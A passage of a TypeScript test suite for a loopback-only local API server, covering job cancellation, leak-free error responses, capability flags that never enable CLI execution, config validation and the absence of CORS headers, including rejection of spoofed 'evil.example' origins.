    const b = make({ failure: 'timeout', config: { aiTimeoutMs: 60_000 } });
    const sb = await login(b);
    await gen(b, sb.h, 'key-running-1');
    const queued = JobAccepted.parse((await gen(b, sb.h, 'key-queued-001')).json()).jobId;
    const c = await post(b, `/local/v1/jobs/${queued}/cancel`, undefined, sb.h);
    expect((c.json() as { state: string }).state).toBe('cancelled');
    const c2 = await post(b, `/local/v1/jobs/${queued}/cancel`, undefined, sb.h);
    expect((c2.json() as { state: string }).state).toBe('cancelled');
    expect(JobStatus.parse((await get(b, `/local/v1/jobs/${queued}`, { cookie: sb.cookie })).json()).state).toBe('cancelled');
  });
  it('cancelled queued job is not later run to failure (stays cancelled)', async () => {
    const a = make({ failure: 'timeout', config: { aiTimeoutMs: 50 } });
    const s = await login(a);
    await gen(a, s.h, 'key-first-0001');
    const q = JobAccepted.parse((await gen(a, s.h, 'key-second-001')).json()).jobId;
    await post(a, `/local/v1/jobs/${q}/cancel`, undefined, s.h);
    await new Promise(r => setTimeout(r, 300));
    expect(JobStatus.parse((await get(a, `/local/v1/jobs/${q}`, { cookie: s.cookie })).json()).state).toBe('cancelled');
  });
  it('JobAccepted and queued JobStatus validate against contract schemas', async () => {
    const a = make({ failure: 'timeout', config: { aiTimeoutMs: 60_000 } });
    const s = await login(a);
    const r = await gen(a, s.h);
    expect(r.statusCode).toBe(202);
    const acc = JobAccepted.parse(r.json());
    const st = JobStatus.parse((await get(a, `/local/v1/jobs/${acc.jobId}`, { cookie: s.cookie })).json());
    expect(['queued', 'running']).toContain(st.state);
    expect(Object.keys(r.json() as object).sort()).toEqual(['jobId', 'pollAfterMs', 'state']);
  });
});

describe('error shape and information hiding', () => {
  it('all error responses validate as ApiError with requestId header match and no internals', async () => {
    const a = make();
    const s = await pair(a);
    const reqs = [
      () => a.app.inject({ url: '/nope', headers: { host: HOST } }),
      () => a.app.inject({ url: '/local/v1/health', headers: { host: 'evil' } }),
      () => post(a, '/local/v1/auth/login', {}, s.h),
      () => post(a, '/local/v1/pair', { code: 'x' }),
      () => a.app.inject({ method: 'POST', url: '/local/v1/pair', payload: '{', headers: { host: HOST, origin: ORIGIN, 'content-type': 'application/json' } }),
      () => a.app.inject({ method: 'PATCH', url: '/local/v1/health', headers: { host: HOST, origin: ORIGIN } }),
    ];
    for (const f of reqs) {
      const r = await f();
      expect(r.statusCode).toBeGreaterThanOrEqual(400);
      const e = apiErr(r);
      expect(r.headers['x-request-id']).toBe(e.requestId);
      noLeak(r.body);
    }
  });
  it('every error code maps to the contract HTTP status', async () => {
    const { ERROR_HTTP_STATUS } = await import('@tkb/contracts');
    const a = make();
    const r = await get(a, '/local/v1/jobs/x');
    expect(r.statusCode).toBe(ERROR_HTTP_STATUS[apiErr(r).code]);
  });
});

describe('capabilities never claim CLI availability', () => {
  const combos: NodeJS.ProcessEnv[] = [];
  for (const exec of [undefined, 'true', 'false', 'TRUE', '1', 'yes'])
    for (const bind of [undefined, 'localhost', '::1'])
      combos.push({ ALLOW_CLAUDE_EXECUTION: exec, PERSONAL_BIND: bind, PERSONAL_ALLOWED_USER_IDS: 'u1', CLAUDE_PATH: '/usr/bin/claude', AI_TIMEOUT_SECONDS: '5' });
  it('available:false, runner never claude-code, in any config combination', async () => {
    for (const env of combos) {
      const a = make({ env, config: {} });
      const r = await get(a, '/local/v1/capabilities');
      const c = Capabilities.parse(r.json());
      expect(c.entry).toBe('personal');
      expect(c.aiGeneration.available, JSON.stringify(env)).toBe(false);
      expect(c.aiGeneration.runner).not.toBe('claude-code');
      expect(c.aiGeneration.reason).not.toBeNull();
    }
  });
  it('is not changed by login state either, and a stuck/failed login does not enable it', async () => {
    const a = make({ env: { ALLOW_CLAUDE_EXECUTION: 'true' } });
    const s = await login(a);
    const c = Capabilities.parse((await get(a, '/local/v1/capabilities', { cookie: s.cookie })).json());
    expect(c.aiGeneration.available).toBe(false);
    expect(c.aiGeneration.runner).not.toBe('claude-code');
  });
  it('even with an injected runner that claims nothing, capabilities do not flip', async () => {
    const config = loadConfig({ ALLOW_CLAUDE_EXECUTION: 'true', PERSONAL_ALLOWED_USER_IDS: 'u1' });
    const app = buildApp({ config, runner: new FakeRunner(), fetch: sharedFetch() });
    apps.push(app);
    const c = Capabilities.parse((await app.inject({ url: '/local/v1/capabilities', headers: { host: HOST } })).json());
    expect(c.aiGeneration).toMatchObject({ available: false });
  });
  it('non-loopback bind is refused by config (public entry cannot start the CLI process)', () => {
    for (const b of ['0.0.0.0', '::', '192.168.1.5', '10.0.0.1', 'example.com', '']) {
      if (b === '') continue;
      expect(() => loadConfig({ PERSONAL_BIND: b }), b).toThrow();
    }
    expect(() => loadConfig({ PERSONAL_PORT: '0' })).toThrow();
    expect(() => loadConfig({ PERSONAL_PORT: '70000' })).toThrow();
    expect(() => loadConfig({ AI_TIMEOUT_SECONDS: '0' })).toThrow();
    expect(() => loadConfig({ AI_QUEUE_LIMIT: '-1' })).toThrow();
  });
  it('allowlist parsing: empty/whitespace entries never match an empty userId; default is deny-all', () => {
    expect(loadConfig({}).allowedUserIds).toEqual([]);
    expect(loadConfig({ PERSONAL_ALLOWED_USER_IDS: ' , ,u1,, ' }).allowedUserIds).toEqual(['u1']);
  });
});

describe('no CORS anywhere', () => {
  const corsKeys = (h: Record<string, unknown>) => Object.keys(h).filter(k => k.toLowerCase().startsWith('access-control-'));
  it('no Access-Control-* header on success, error, 404, 403 and preflight', async () => {
    const a = make();
    const s = await login(a);
    const rs = [
      await get(a, '/local/v1/health', { origin: ORIGIN }),
      await get(a, '/local/v1/health', { origin: 'http://evil.example' }),
      await get(a, '/nope', { origin: ORIGIN }),
      await a.app.inject({ url: '/local/v1/health', headers: { host: 'evil.example', origin: 'http://evil.example' } }),
      await gen(a, s.h),
      await gen(a, { cookie: s.cookie, 'x-csrf-token': 'bad' }),
      await a.app.inject({ method: 'OPTIONS', url: '/local/v1/generations', headers: { host: HOST, origin: 'http://evil.example', 'access-control-request-method': 'POST' } }),
      await a.app.inject({ method: 'OPTIONS', url: '/local/v1/generations', headers: { host: HOST, origin: ORIGIN, 'access-control-request-method': 'POST', 'access-control-request-headers': 'x-csrf-token' } }),
      await a.app.inject({ method: 'OPTIONS', url: '/local/v1/health', headers: { host: HOST } }),
      await a.app.inject({ method: 'OPTIONS', url: '/local/v1/pair', headers: { host: HOST, origin: ORIGIN } }),
    ];
    for (const r of rs) expect(corsKeys(r.headers)).toEqual([]);
    // preflight from a foreign origin is refused outright
    expect(rs[6]!.statusCode).toBe(403);
    // preflight never succeeds with 2xx carrying a permissive answer
    expect(rs[7]!.statusCode).not.toBe(204);
  });
});
